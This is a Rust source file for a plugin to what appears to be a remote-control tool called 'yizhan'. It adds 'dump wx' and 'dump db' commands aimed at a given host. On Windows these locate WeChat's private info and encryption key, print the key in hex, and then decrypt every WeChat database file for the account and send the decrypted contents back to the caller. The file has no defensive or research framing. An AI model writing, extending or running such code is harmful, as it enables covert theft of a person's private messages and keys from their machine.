use yizhan_plugin::Plugin;
use yizhan_protocol::command::{UserCommand, UserCommandResult};

#[cfg(windows)]
mod dump;

#[derive(Default)]
pub struct YiZhanDumpWxPlugin {}

impl Plugin for YiZhanDumpWxPlugin {
    fn parse_command(&self, inputs: &[&str]) -> Option<(Option<String>, UserCommand)> {
        match inputs {
            ["dump", "wx", host] => Some((
                Some(host.to_string()),
                UserCommand::PluginCommand("dump".to_string(), "wx".to_string()),
            )),
            ["dump", "db", host] => Some((
                Some(host.to_string()),
                UserCommand::PluginCommand("dump".to_string(), "db".to_string()),
            )),
            _ => None,
        }
    }

    #[cfg(windows)]
    fn execute_command(&self, group_id: &str, content: &str) -> Option<UserCommandResult> {
        use tracing::{info, warn};
        use yizhan_protocol::command::UserCommandResponse;

        match (group_id, content) {
            ("dump", "wx") => {
                info!("Finding wechat info ...");

                Some(match dump::auto_find_wechat_info() {
                    Err(err) => {
                        warn!("find wechat info error: {:?}", err);
                        UserCommandResult::Err(format!("find wechat info error: {:?}", err))
                    }
                    Ok(info) => UserCommandResult::Ok(UserCommandResponse::PluginCommand(format!(
                        "Key: {}\n{:#?}",
                        info.key
                            .iter()
                            .map(|c| format!("{:02X}", c))
                            .collect::<Vec<_>>()
                            .join(""),
                        info
                    ))),
                })
            }
            ("dump", "db") => {
                info!("Dumping wx db ...");

                Some(match dump_wx_db() {
                    Ok(result) => UserCommandResult::Ok(UserCommandResponse::PluginBinaryCommand(
                        "dump".to_string(),
                        "db".to_string(),
                        bincode::encode_to_vec(&result, bincode::config::standard()).unwrap(),
                    )),
                    Err(err) => {
                        UserCommandResult::Err(format!("find wechat info error: {:?}", err))
                    }
                })
            }
            _ => None,
        }
    }

    #[cfg(not(windows))]
    fn execute_command(&self, _group_id: &str, _content: &str) -> Option<UserCommandResult> {
        None
    }

    #[cfg(windows)]
    fn show_response(
        &self,
        response: &yizhan_protocol::command::UserCommandResponse,
    ) -> Option<String> {
        use yizhan_protocol::command::UserCommandResponse;

        use crate::dump::DecryptedDbFile;

        match response {
            UserCommandResponse::PluginBinaryCommand(group_id, cmd, bytes)
                if group_id == "dump" && cmd == "db" =>
            {
                let info: Vec<DecryptedDbFile> =
                    bincode::decode_from_slice(bytes.as_slice(), bincode::config::standard())
                        .ok()?
                        .0;
                Some(format!("decrypted file count: {:?}", info.len()))
            }
            _ => None,
        }
    }
}

#[cfg(windows)]
fn dump_wx_db() -> anyhow::Result<Vec<dump::DecryptedDbFile>> {
    use crate::dump::{decrypt_wechat_db_file, DecryptedDbFile, WeChatPrivateInfo, WxDbFiles};

    let mut result = Vec::new();

    let WeChatPrivateInfo { wxid, key, .. } = dump::auto_find_wechat_info()?;
    let dir = WxDbFiles::new(&wxid)?;
    for db_file in dir {
        let db_file = db_file?;
        let content = decrypt_wechat_db_file(&key, std::fs::read(db_file.path)?.as_slice())?;
        let info = DecryptedDbFile {
            bytes: content,
            file_name: db_file.file_name,
            index: db_file.index,
        };
        result.push(info);
    }

    Ok(result)
}
